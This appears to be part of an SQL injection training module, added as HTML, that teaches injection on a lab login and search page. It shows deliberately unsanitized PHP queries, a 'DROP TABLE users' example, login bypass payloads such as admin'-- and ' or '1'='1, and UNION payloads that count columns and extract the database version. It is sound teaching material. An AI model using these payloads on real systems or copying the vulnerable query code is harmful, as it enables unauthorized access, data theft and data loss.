+<p>For example, within a <code>PHP</code> web application, we can connect to our database, and start using the <code>MySQL</code> database through <code>MySQL</code> syntax, right within <code>PHP</code>, as follows:</p>
+<pre><code class="lang-php">$conn = <span class="hljs-keyword">new</span> mysqli(<span class="hljs-string">"localhost"</span>, <span class="hljs-string">"root"</span>, <span class="hljs-string">"password"</span>, <span class="hljs-string">"users"</span>);
+$query = <span class="hljs-string">"select * from logins"</span>;
+$result = $conn-&gt;query($query);
+</code></pre>
+<p>Then, the query's output will be stored in <code>$result</code>, and we can print it to the page or use it in any other way. The below PHP code will print all returned results of the SQL query in new lines:</p>
+<pre><code class="lang-php"><span class="hljs-keyword">while</span>($row = $result-&gt;fetch_assoc() ){
+    <span class="hljs-keyword">echo</span> $row[<span class="hljs-string">"name"</span>].<span class="hljs-string">"&lt;br&gt;"</span>;
+}
+</code></pre>
+<p>Web applications also usually use user-input when retrieving data. For example, when a user uses the search function to search for other users, their search input is passed to the web application, which uses the input to search within the databases:</p>
+<pre><code class="lang-php"><span class="hljs-variable">$searchInput</span> =  <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'findUser'</span>];
+<span class="hljs-variable">$query</span> = <span class="hljs-string">"select * from logins where username like '%<span class="hljs-variable">$searchInput</span>'"</span>;
+<span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$query</span>);
+</code></pre>
+<p><code>If we use user-input within an SQL query, and if not securely coded, it may cause a variety of issues, like SQL Injection vulnerabilities.</code></p>
+<hr>
+<h3 id="what-is-an-injection-">What is an Injection?</h3>
+<p>In the above example, we accept user input and pass it directly to the SQL query without sanitization.</p>
+<p>Sanitization refers to the removal of any special characters in user-input, in order to break any injection attempts.</p>
+<p>Injection occurs when an application misinterprets user input as actual code rather than a string, changing the code flow and executing it. This can occur by escaping user-input bounds by injecting a special character like (<code>'</code>), and then writing code to be executed, like JavaScript code or SQL in SQL Injections. Unless the user input is sanitized, it is very likely to execute the injected code and run it.</p>
+<hr>
+<h3 id="sql-injection">SQL Injection</h3>
+<p>An SQL injection occurs when user-input is inputted into the SQL query string without properly sanitizing or filtering the input. The previous example showed how user-input can be used within an SQL query, and it did not use any form of input sanitization:</p>
+<pre><code class="lang-php"><span class="hljs-variable">$searchInput</span> =  <span class="hljs-variable">$_POST</span>[<span class="hljs-string">'findUser'</span>];
+<span class="hljs-variable">$query</span> = <span class="hljs-string">"select * from logins where username like '%<span class="hljs-variable">$searchInput</span>'"</span>;
+<span class="hljs-variable">$result</span> = <span class="hljs-variable">$conn</span>-&gt;query(<span class="hljs-variable">$query</span>);
+</code></pre>
+<p>In typical cases, the <code>searchInput</code> would be inputted to complete the query, returning the expected outcome. Any input we type goes into the following SQL query:</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> logins <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">'%$searchInput'</span>
+</code></pre>
+<p>So, if we input <code>admin</code>, it becomes <code>'%admin'</code>. In this case, if we write any SQL code, it would just be considered as a search term. For example, if we input <code>SHOW DATABASES;</code>, it would be executed as <code>'%SHOW DATABASES;'</code> The web application will search for usernames similar to <code>SHOW DATABASES;</code>. However, as there is no sanitization, in this case, <strong>we can add a single quote (<code>'</code>), which will end the user-input field, and after it, we can write actual SQL code</strong>. For example, if we search for <code>1'; DROP TABLE users;</code>, the search input would be:</p>
+<pre><code class="lang-php">'%1'; <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">users</span>;'
+</code></pre>
+<p>Notice how we added a single quote (') after "1", in order to escape the bounds of the user-input in ('%$searchInput').</p>
+<p>So, the final SQL query executed would be as follows:</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> logins <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">'%1'</span>; <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">users</span>;'
+</code></pre>
+<p>As we can see from the syntax highlighting, we can escape the original query's bounds and have our newly injected query execute as well. <code>Once the query is run, the</code> users <code>table will get deleted.</code></p>
+<p>Note: In the above example, for the sake of simplicity, we added another SQL query after a semi-colon (;). Though this is actually not possible with MySQL, it is possible with MSSQL and PostgreSQL. In the coming sections, we'll discuss the real methods of injecting SQL queries in MySQL.</p>
+<hr>
+<h3 id="syntax-errors">Syntax Errors</h3>
+<p>The previous example of SQL injection would return an error:</p>
+<pre><code class="lang-php"><span class="hljs-keyword">Error: </span>near line 1: near "'": syntax error
+</code></pre>
+<p>This is because of the last trailing character, where we have a single extra quote (<code>'</code>) that is not closed, which causes a SQL syntax error when executed:</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">select</span> * <span class="hljs-keyword">from</span> logins <span class="hljs-keyword">where</span> username <span class="hljs-keyword">like</span> <span class="hljs-string">'%1'</span>; <span class="hljs-keyword">DROP</span> <span class="hljs-keyword">TABLE</span> <span class="hljs-keyword">users</span>;'
+</code></pre>
+<p>In this case, we had only one trailing character, as our input from the search query was near the end of the SQL query. However, the user input usually goes in the middle of the SQL query, and the rest of the original SQL query comes after it.</p>
+<p>To have a successful injection, we must ensure that the newly modified SQL query is still valid and does not have any syntax errors after our injection. In most cases, we would not have access to the source code to find the original SQL query and develop a proper SQL injection to make a valid SQL query. So, how would we be able to inject into the SQL query then successfully?</p>
+<p>One answer is by using <code>comments</code>, and we will discuss this in a later section. Another is to make the query syntax work by passing in multiple single quotes, as we will discuss next (<code>'</code>).</p>
+<p>Now that we understand SQL injections' basics let us start learning some practical uses.</p>
+<hr>
+<h3 id="types-of-sql-injections">Types of SQL Injections</h3>
+<p>SQL Injections are categorized based on how and where we retrieve their output.</p>
+<p><img src="storage\modules\33\types\_of\_sqli.jpg" alt="dbms\_architecture"></p>
+<p>In simple cases, the output of both the intended and the new query may be printed directly on the front end, and we can directly read it. This is known as <code>In-band</code> SQL injection, and it has two types: <code>Union Based</code> and <code>Error Based</code>.</p>
+<p>With <code>Union Based</code> SQL injection, we may have to specify the exact location, 'i.e., column', which we can read, so the query will direct the output to be printed there. As for <code>Error Based</code> SQL injection, it is used when we can get the <code>PHP</code> or <code>SQL</code> errors in the front-end, and so we may intentionally cause an SQL error that returns the output of our query.</p>
+<p>In more complicated cases, we may not get the output printed, so we may utilize SQL logic to retrieve the output character by character. This is known as <code>Blind</code> SQL injection, and it also has two types: <code>Boolean Based</code> and <code>Time Based</code>.</p>
+<p>With <code>Boolean Based</code> SQL injection, we can use SQL conditional statements to control whether the page returns any output at all, 'i.e., original query response,' if our conditional statement returns <code>true</code>. As for <code>Time Based</code> SQL injections, we use SQL conditional statements that delay the page response if the conditional statement returns <code>true</code> using the <code>Sleep()</code> function.</p>
+<p>Finally, in some cases, we may not have direct access to the output whatsoever, so we may have to direct the output to a remote location, 'i.e., DNS record,' and then attempt to retrieve it from there. This is known as <code>Out-of-band</code> SQL injection.</p>
+<p>In this module, we will only be focusing on introducing SQL injections through learning about <code>Union Based</code> SQL injection.</p>
+<h2 id="subverting-query-logic">Subverting Query Logic</h2>
+<hr>
+<p>Now that we have a basic idea about how SQL statements work let us get started with SQL injection. Before we start executing entire SQL queries, we will first learn to modify the original query by injecting the <code>OR</code> operator and using SQL comments to subvert the original query's logic. A basic example of this is bypassing web authentication, which we will demonstrate in this section.</p>
+<hr>
+<h3 id="authentication-bypass">Authentication Bypass</h3>
+<p>Consider the following administrator login page.</p>
+<p><img src="storage\modules\33\admin\_panel.png" alt="admin\_panel"></p>
+<p>We can log in with the administrator credentials <code>admin / p@ssw0rd</code>.</p>
+<p><img src="storage\modules\33\admin\_creds.png" alt="admin\_creds"></p>
+<p>The page also displays the SQL query being executed to understand better how we will subvert the query logic. Our goal is to log in as the admin user without using the existing password. As we can see, the current SQL query being executed is:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> logins <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">'admin'</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">password</span> = <span class="hljs-string">'p@ssw0rd'</span>;
+</code></pre>
+<p>The page takes in the credentials, then uses the <code>AND</code> operator to select records matching the given username and password. If the <code>MySQL</code> database returns matched records, the credentials are valid, so the <code>PHP</code> code would evaluate the login attempt condition as <code>true</code>. If the condition evaluates to <code>true</code>, the admin record is returned, and our login is validated. Let us see what happens when we enter incorrect credentials.</p>
+<p><img src="storage\modules\33\admin\_incorrect.png" alt="admin\_incorrect"></p>
+<p>As expected, the login failed due to the wrong password leading to a <code>false</code> result from the <code>AND</code> operation.</p>
+<hr>
+<h3 id="sqli-discovery">SQLi Discovery</h3>
+<p>Before we start subverting the web application's logic and attempting to bypass the authentication, we first have to test whether the login form is vulnerable to SQL injection. To do that, we will try to add one of the below payloads after our username and see if it causes any errors or changes how the page behaves:</p>
+<table>
+<thead>
+<tr>
+<th>Payload</th>
+<th>URL Encoded</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>'</code></td>
+<td><code>%27</code></td>
+</tr>
+<tr>
+<td><code>"</code></td>
+<td><code>%22</code></td>
+</tr>
+<tr>
+<td><code>#</code></td>
+<td><code>%23</code></td>
+</tr>
+<tr>
+<td><code>;</code></td>
+<td><code>%3B</code></td>
+</tr>
+<tr>
+<td><code>)</code></td>
+<td><code>%29</code></td>
+</tr>
+</tbody>
+</table>
+<p>Note: In some cases, we may have to use the URL encoded version of the payload. An example of this is when we put our payload directly in the URL 'i.e. HTTP GET request'.</p>
+<p>So, let us start by injecting a single quote:</p>
+<p><img src="storage\modules\33\quote\_error.png" alt="quote\_error"></p>
+<p>We see that a SQL error was thrown instead of the <code>Login Failed</code> message. The page threw an error because the resulting query was:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> logins <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">''' AND password = '</span>something<span class="hljs-string">';</span>
+</code></pre>
+<p>As discussed in the previous section, the quote we entered resulted in an odd number of quotes, causing a syntax error. One option would be to comment out the rest of the query and write the remainder of the query as part of our injection to form a working query. Another option is to use an even number of quotes within our injected query, such that the final query would still work.</p>
+<hr>
+<h3 id="or-injection">OR Injection</h3>
+<p>We would need the query always to return <code>true</code>, regardless of the username and password entered, to bypass the authentication. To do this, we can abuse the <code>OR</code> operator in our SQL injection.</p>
+<p>As previously discussed, the MySQL documentation for <a href="https://dev.mysql.com/doc/refman/8.0/en/operator-precedence.html">operation precedence</a> states that the <code>AND</code> operator would be evaluated before the <code>OR</code> operator. This means that if there is at least one <code>TRUE</code> condition in the entire query along with an <code>OR</code> operator, the entire query will evaluate to <code>TRUE</code> since the <code>OR</code> operator returns <code>TRUE</code> if one of its operands is <code>TRUE</code>.</p>
+<p>An example of a condition that will always return <code>true</code> is <code>'1'='1'</code>. However, to keep the SQL query working and keep an even number of quotes, instead of using ('1'='1'), we will remove the last quote and use ('1'='1), so the remaining single quote from the original query would be in its place.</p>
+<p>So, if we inject the below condition and have an <code>OR</code> operator between it and the original condition, it should always return <code>true</code>:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-literal">admin</span><span class="hljs-string">' or '</span><span class="hljs-number">1</span><span class="hljs-string">'='</span><span class="hljs-number">1</span>
+</code></pre>
+<p>The final query should be as follow:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> logins <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">'admin'</span> <span class="hljs-keyword">or</span> <span class="hljs-string">'1'</span>=<span class="hljs-string">'1'</span> <span class="hljs-keyword">AND</span> <span class="hljs-keyword">password</span> = <span class="hljs-string">'something'</span>;
+</code></pre>
+<p>This means the following:</p>
+<ul>
+<li>If username is <code>admin</code>\
+<code>OR</code></li>
+<li>If <code>1=1</code> return <code>true</code> 'which always returns <code>true</code>'\
+<code>AND</code></li>
+<li>If password is <code>something</code></li>
+</ul>
+<p><img src="storage\modules\33\or\_inject\_diagram.png" alt="or\_inject\_diagram"></p>
+<p>The <code>AND</code> operator will be evaluated first, and it will return <code>false</code>. Then, the <code>OR</code> operator would be evalutated, and if either of the statements is <code>true</code>, it would return <code>true</code>. Since <code>1=1</code> always returns <code>true</code>, this query will return <code>true</code>, and it will grant us access.</p>
+<p>Note: The payload we used above is one of many auth bypass payloads we can use to subvert the authentication logic. You can find a comprehensive list of SQLi auth bypass payloads in <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection#authentication-bypass">PayloadAllTheThings</a>, each of which works on a certain type of SQL queries.</p>
+<hr>
+<h3 id="auth-bypass-with-or-operator">Auth Bypass with OR operator</h3>
+<p>Let us try this as the username and see the response. <img src="storage\modules\33\inject\_success.png" alt="inject\_success"></p>
+<p>We were able to log in successfully as admin. However, what if we did not know a valid username? Let us try the same request with a different username this time.</p>
+<p><img src="storage\modules\33\notadmin\_fail.png" alt="notadmin\_fail"></p>
+<p>The login failed because <code>notAdmin</code> does not exist in the table and resulted in a false query overall.</p>
+<p><img src="storage\modules\33\notadmin\_diagram\_1.png" alt="notadmin\_diagram"></p>
+<p>To successfully log in once again, we will need an overall <code>true</code> query. This can be achieved by injecting an <code>OR</code> condition into the password field, so it will always return <code>true</code>. Let us try <code>something' or '1'='1</code> as the password.</p>
+<p><img src="storage\modules\33\password\_or\_injection.png" alt="password\_or\_injection"></p>
+<p>The additional <code>OR</code> condition resulted in a <code>true</code> query overall, as the <code>WHERE</code> clause returns everything in the table, and the user present in the first row is logged in. In this case, as both conditions will return <code>true</code>, we do not have to provide a test username and password and can directly start with the <code>'</code> injection and log in with just <code>' or '1' = '1</code>.</p>
+<p><img src="storage\modules\33\basic\_auth\_bypass.png" alt="basic\_auth\_bypass"></p>
+<p>This works since the query evaluate to <code>true</code> irrespective of the username or password.</p>
+<h2 id="using-comments">Using Comments</h2>
+<hr>
+<p>This section will learn how to use comments to subvert the logic of more advanced SQL queries and end up with a working SQL query to bypass the login authentication process.</p>
+<hr>
+<h3 id="comments">Comments</h3>
+<p>Just like any other language, SQL allows the use of comments as well. Comments are used to document queries or ignore a certain part of the query. We can use two types of line comments with MySQL <code>--</code> and <code>#</code>, in addition to an in-line comment <code>/**/</code> (though this is not usually used in SQL injections). The <code>--</code> can be used as follows:</p>
+<p>Using Comments</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT username FROM logins; -- Selects usernames from the logins table 
+
+<span class="hljs-code">+---------------+</span>
+<span class="hljs-section">| username      |
++---------------+</span>
+| admin         |
+| administrator |
+| john          |
+<span class="hljs-section">| tom           |
++---------------+</span>
+4 rows in set (0.00 sec)
+</code></pre>
+<p>Note: In SQL, using two dashes only is not enough to start a comment. So, there has to be an empty space after them, so the comment starts with (-- ), with a space at the end. This is sometimes URL encoded as (--+), as spaces in URLs are encoded as (+). To make it clear, we will add another (-) at at the end (-- -), to show the use of a space character.</p>
+<p>The <code>#</code> symbol can be used as well.</p>
+<p>Using Comments</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT * FROM logins WHERE username = <span class="hljs-emphasis">'admin'</span>; # You can place anything here AND password = <span class="hljs-emphasis">'something'</span>
+
+<span class="hljs-code">+----+</span>----------<span class="hljs-code">+----------+</span>---------------------+
+<span class="hljs-section">| id | username | password | date_of_joining     |
++----+----------+----------+---------------------+</span>
+<span class="hljs-section">|  1 | admin    | p@ssw0rd | 2020-07-02 00:00:00 |
++----+----------+----------+---------------------+</span>
+1 row in set (0.00 sec)
+</code></pre>
+<p>Tip: if you are inputting your payload in the URL within a browser, a (#) symbol is usually considered as a tag, and will not be passed as part of the URL. In order to use (#) as a comment within a browser, we can use '%23', which is an URL encoded (#) symbol.</p>
+<p>The server will ignore the part of the query with <code>AND password = 'something'</code> during evaluation.</p>
+<hr>
+<h3 id="auth-bypass-with-comments">Auth Bypass with comments</h3>
+<p>Let us go back to our previous example and inject <code>admin'--</code> as our username. The final query will be:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> logins <span class="hljs-keyword">WHERE</span> username=<span class="hljs-string">'admin'</span>-- <span class="hljs-string">' AND password = '</span>something<span class="hljs-string">';</span>
+</code></pre>
+<p>As we can see from the syntax highlighting, the username is now <code>admin</code>, and the remainder of the query is now ignored as a comment. Also, this way, we can ensure that the query does not have any syntax issues.</p>
+<p>Let us try using these on the login page, and log in with the username <code>admin'--</code> and anything as the password:</p>
+<p><img src="storage\modules\33\admin\_dash.png" alt="admin\_dash"></p>
+<p>As we see, we were able to bypass the authentication, as the new modified query checks for the username, with no other conditions.</p>
+<hr>
+<h3 id="another-example">Another Example</h3>
+<p>SQL supports the usage of parenthesis if the application needs to check for particular conditions before others. Expressions within the parenthesis take precedence over other operators and are evaluated first. Let us look at a scenario like this:</p>
+<p><img src="storage\modules\33\paranthesis\_fail.png" alt="paranthesis\_fail"></p>
+<p>The above query ensures that the user's id is always greater than 1, which will prevent anyone from logging in as admin. Additionally, we also see that the password was hashed before being used in the query. This will prevent us from injecting through the password field because the input is changed to a hash.</p>
+<p>Let us try logging in with valid credentials <code>admin / p@ssw0rd</code> to see the response.</p>
+<p><img src="storage\modules\33\paranthesis\_valid\_fail.png" alt="paranthesis\_valid\_fail"></p>
+<p>As expected, the login failed even though we supplied valid credentials because the admin’s ID equals 1. So let us try logging in with the credentials of another user, such as <code>tom</code>.</p>
+<p><img src="storage\modules\33\tom\_login.png" alt="tom\_login"></p>
+<p>Logging in as the user with an id not equal to 1 was successful. So, how can we log in as the admin? We know from the previous section on comments that we can use them to comment out the rest of the query. So, let us try using <code>admin'--</code> as the username.</p>
+<p><img src="storage\modules\33\paranthesis\_error.png" alt="paranthesis\_error"></p>
+<p>The login failed due to a syntax error, as a closed one did not balance the open parenthesis. To execute the query successfully, we will have to add a closing parenthesis. Let us try using the username <code>admin')--</code> to close and comment out the rest.</p>
+<p><img src="storage\modules\33\paranthesis\_success.png" alt="paranthesis\_success"></p>
+<p>The query was successful, and we logged in as admin. The final query as a result of our input is:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> logins <span class="hljs-keyword">where</span> (username=<span class="hljs-string">'admin'</span>)
+</code></pre>
+<p>The query above is like the one from the previous example and returns the row containing admin.</p>
+<h2 id="union-clause">Union Clause</h2>
+<hr>
+<p>So far, we have only been manipulating the original query to subvert the web application logic and bypass authentication, using the <code>OR</code> operator and comments. However, another type of SQL injection is injecting entire SQL queries executed along with the original query. This section will demonstrate this by using the MySQL <code>Union</code> clause to do <code>SQL Union Injection</code>.</p>
+<hr>
+<h3 id="union">Union</h3>
+<p>Before we start learning about Union Injection, we should first learn more about the SQL Union clause. The <a href="https://dev.mysql.com/doc/refman/8.0/en/union.html">Union</a> clause is used to combine results from multiple <code>SELECT</code> statements. This means that through a <code>UNION</code> injection, we will be able to <code>SELECT</code> and dump data from all across the DBMS, from multiple tables and databases. Let us try using the <code>UNION</code> operator in a sample database. First, let us see the content of the <code>ports</code> table:</p>
+<p>Union Clause</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT * FROM ports;
+
+<span class="hljs-code">+----------+</span>-----------+
+<span class="hljs-section">| code     | city      |
++----------+-----------+</span>
+| CN SHA   | Shanghai  |
+| SG SIN   | Singapore |
+<span class="hljs-section">| ZZ-21    | Shenzhen  |
++----------+-----------+</span>
+3 rows in set (0.00 sec)
+</code></pre>
+<p>Next, let us see the output of the <code>ships</code> tables:</p>
+<p>Union Clause</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT * FROM ships;
+
+<span class="hljs-code">+----------+</span>-----------+
+<span class="hljs-section">| Ship     | city      |
++----------+-----------+</span>
+<span class="hljs-section">| Morrison | New York  |
++----------+-----------+</span>
+1 rows in set (0.00 sec)
+</code></pre>
+<p>Now, let us try to use <code>UNION</code> to combine both results:</p>
+<p>Union Clause</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT * FROM ports UNION SELECT * FROM ships;
+
+<span class="hljs-code">+----------+</span>-----------+
+<span class="hljs-section">| code     | city      |
++----------+-----------+</span>
+| CN SHA   | Shanghai  |
+| SG SIN   | Singapore |
+| Morrison | New York  |
+<span class="hljs-section">| ZZ-21    | Shenzhen  |
++----------+-----------+</span>
+4 rows in set (0.00 sec)
+</code></pre>
+<p>As we can see, <code>UNION</code> combined the output of both <code>SELECT</code> statements into one, so entries from the <code>ports</code> table and the <code>ships</code> table were combined into a single output with four rows. As we can see, some of the rows belong to the <code>ports</code> table while others belong to the <code>ships</code> table.</p>
+<p>Note: The data types of the selected columns on all positions should be the same.</p>
+<hr>
+<h3 id="even-columns">Even Columns</h3>
+<p>A <code>UNION</code> statement can only operate on <code>SELECT</code> statements with an equal number of columns. For example, if we attempt to <code>UNION</code> two queries that have results with a different number of columns, we get the following error:</p>
+<p>Union Clause</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT city FROM ports UNION SELECT * FROM ships;
+
+<span class="hljs-keyword">ERROR </span>1222 (21000): The used SELECT statements have a different number of columns
+</code></pre>
+<p>The above query results in an error, as the first <code>SELECT</code> returns one column and the second <code>SELECT</code> returns two. Once we have two queries that return the same number of columns, we can use the <code>UNION</code> operator to extract data from other tables and databases.</p>
+<p>For example, if the query is:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> products <span class="hljs-keyword">WHERE</span> product_id = <span class="hljs-string">'user_input'</span>
+</code></pre>
+<p>We can inject a <code>UNION</code> query into the input, such that rows from another table are returned:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">from</span> products <span class="hljs-keyword">where</span> product_id = <span class="hljs-string">'1'</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> username, <span class="hljs-keyword">password</span> <span class="hljs-keyword">from</span> passwords<span class="hljs-comment">-- '</span>
+</code></pre>
+<p>The above query would return <code>username</code> and <code>password</code> entries from the <code>passwords</code> table, assuming the <code>products</code> table has two columns.</p>
+<hr>
+<h3 id="un-even-columns">Un-even Columns</h3>
+<p>We will find out that the original query will usually not have the same number of columns as the SQL query we want to execute, so we will have to work around that. For example, suppose we only had one column. In that case, we want to <code>SELECT</code>, we can put junk data for the remaining required columns so that the total number of columns we are <code>UNION</code>ing with remains the same as the original query.</p>
+<p>For example, we can use any string as our junk data, and the query will return the string as its output for that column. If we <code>UNION</code> with the string <code>"junk"</code>, the <code>SELECT</code> query would be <code>SELECT "junk" from passwords</code>, which will always return <code>junk</code>. We can also use numbers. For example, the query <code>SELECT 1 from passwords</code> will always return <code>1</code> as the output.</p>
+<p>Note: When filling other columns with junk data, we must ensure that the data type matches the columns data type, otherwise the query will return an error. For the sake of simplicity, we will use numbers as our junk data, which will also become handy for tracking our payloads positions, as we will discuss later.</p>
+<p>Tip: For advanced SQL injection, we may want to simply use 'NULL' to fill other columns, as 'NULL' fits all data types.</p>
+<p>The <code>products</code> table has two columns in the above example, so we have to <code>UNION</code> with two columns. If we only wanted to get one column 'e.g. <code>username</code>', we have to do <code>username, 2</code>, such that we have the same number of columns:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">from</span> products <span class="hljs-keyword">where</span> product_id = <span class="hljs-string">'1'</span> <span class="hljs-keyword">UNION</span> <span class="hljs-keyword">SELECT</span> username, <span class="hljs-number">2</span> <span class="hljs-keyword">from</span> passwords
+</code></pre>
+<p>If we had more columns in the table of the original query, we have to add more numbers to create the remaining required columns. For example, if the original query used <code>SELECT</code> on a table with four columns, our <code>UNION</code> injection would be:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">UNION SELECT username, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>, <span class="hljs-number">4</span> from passwords-- '
+</code></pre>
+<p>This query would return:</p>
+<p>Union Clause</p>
+<pre><code class="lang-shell-session">mysql&gt; SELECT * from products where product<span class="hljs-emphasis">_id UNION SELECT username, 2, 3, 4 from passwords-- '
+
+</span><span class="hljs-code">+-----------+</span>-----------<span class="hljs-code">+-----------+</span>-----------+
+<span class="hljs-section">| product_1 | product_2 | product_3 | product_4 |
++-----------+-----------+-----------+-----------+</span>
+<span class="hljs-section">|   admin   |    2      |    3      |    4      |
++-----------+-----------+-----------+-----------+</span>
+</code></pre>
+<p>As we can see, our wanted output of the '<code>UNION SELECT username from passwords</code>' query is found at the first column of the second row, while the numbers filled the remaining columns.</p>
+<h2 id="union-injection">Union Injection</h2>
+<hr>
+<p>Now that we know how the Union clause works and how to use it let us learn how to utilize it in our SQL injections. Let us take the following example:</p>
+<p><img src="storage\modules\33\ports\_cn.png" alt=""></p>
+<p>We see a potential SQL injection in the search parameters. We apply the SQLi Discovery steps by injecting a single quote (<code>'</code>), and we do get an error:</p>
+<p><img src="storage\modules\33\ports\_quote.png" alt=""></p>
+<p>Since we caused an error, this may mean that the page is vulnerable to SQL injection. This scenario is ideal for exploitation through Union-based injection, as we can see our queries' results.</p>
+<hr>
+<h3 id="detect-number-of-columns">Detect number of columns</h3>
+<p>Before going ahead and exploiting Union-based queries, we need to find the number of columns selected by the server. There are two methods of detecting the number of columns:</p>
+<ul>
+<li>Using <code>ORDER BY</code></li>
+<li>Using <code>UNION</code></li>
+</ul>
+<p><strong>Using ORDER BY</strong></p>
+<p>The first way of detecting the number of columns is through the <code>ORDER BY</code> function, which we discussed earlier. We have to inject a query that sorts the results by a column we specified, 'i.e., column 1, column 2, and so on', until we get an error saying the column specified does not exist.</p>
+<p>For example, we can start with <code>order by 1</code>, sort by the first column, and succeed, as the table must have at least one column. Then we will do <code>order by 2</code> and then <code>order by 3</code> until we reach a number that returns an error, or the page does not show any output, which means that this column number does not exist. The final successful column we successfully sorted by gives us the total number of columns.</p>
+<p>If we failed at <code>order by 4</code>, this means the table has three columns, which is the number of columns we were able to sort by successfully. Let us go back to our previous example and attempt the same, with the following payload:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">1</span>-- -
+</code></pre>
+<p>Reminder: We are adding an extra dash (-) at the end, to show you that there is a space after (--).</p>
+<p>As we see, we get a normal result:</p>
+<p><img src="storage\modules\33\ports\_cn.png" alt=""></p>
+<p>Next, let us try to sort by the second column, with the following payload:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">' <span class="hljs-keyword">order</span> <span class="hljs-title">by</span> <span class="hljs-number">2</span>-- -
+</code></pre>
+<p>We still get the results. We notice that they are sorted differently, as expected:</p>
+<p><img src="storage\modules\33\order\_by\_2.jpg" alt=""></p>
+<p>We do the same for column <code>3</code> and <code>4</code> and get the results back. However, when we try to <code>ORDER BY</code> column 5, we get the following error:</p>
+<p><img src="storage\modules\33\order\_by\_5.jpg" alt=""></p>
+<p>This means that this table has exactly 4 columns .</p>
+<p><strong>Using UNION</strong></p>
+<p>The other method is to attempt a Union injection with a different number of columns until we successfully get the results back. The first method always returns the results until we hit an error, while this method always gives an error until we get a success. We can start by injecting a 3 column <code>UNION</code> query:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">cn' UNION select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>-- -
+</code></pre>
+<p>We get an error saying that the number of columns don’t match:</p>
+<p><img src="storage\modules\33\ports\_columns\_diff.png" alt=""></p>
+<p>So, let’s try four columns and see the response:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">cn' UNION select <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>-- -
+</code></pre>
+<p><img src="storage\modules\33\ports\_columns\_correct.png" alt=""></p>
+<p>This time we successfully get the results, meaning once again that the table has 4 columns. We can use either method to determine the number of columns. Once we know the number of columns, we know how to form our payload, and we can proceed to the next step.</p>
+<hr>
+<h3 id="location-of-injection">Location of Injection</h3>
+<p>While a query may return multiple columns, the web application may only display some of them. So, if we inject our query in a column that is not printed on the page, we will not get its output. This is why we need to determine which columns are printed to the page, to determine where to place our injection. In the previous example, while the injected query returned 1, 2, 3, and 4, we saw only 2, 3, and 4 displayed back to us on the page as the output data:</p>
+<p><img src="storage\modules\33\ports\_columns\_correct.png" alt=""></p>
+<p>It is very common that not every column will be displayed back to the user. For example, the ID field is often used to link different tables together, but the user doesn't need to see it. This tells us that columns 2 and 3, and 4 are printed to place our injection in any of them. <code>We cannot place our injection at the beginning, or its output will not be printed.</code></p>
+<p>This is the benefit of using numbers as our junk data, as it makes it easy to track which columns are printed, so we know at which column to place our query. To test that we can get actual data from the database 'rather than just numbers,' we can use the <code>@@version</code> SQL query as a test and place it in the second column instead of the number 2:</p>
+<p>Code: sql</p>
+<pre><code class="lang-sql">cn' <span class="hljs-built_in">UNION</span> <span class="hljs-built_in">select</span> <span class="hljs-number">1</span>,<span class="hljs-comment">@@</span>version,<span class="hljs-number">3</span>,<span class="hljs-number">4</span>-- -
+</code></pre>
+<p><img src="storage\modules\33\db\_version\_1.jpg" alt=""></p>
+<p>As we can see, we can get the database version displayed. Now we know how to form our Union SQL injection payloads to successfully get the output of our query printed on the page. In the next section, we will discuss how to enumerate the database and get data from other tables and databases.</p>
+<h2 id="database-enumeration">Database Enumeration</h2>
+<hr>
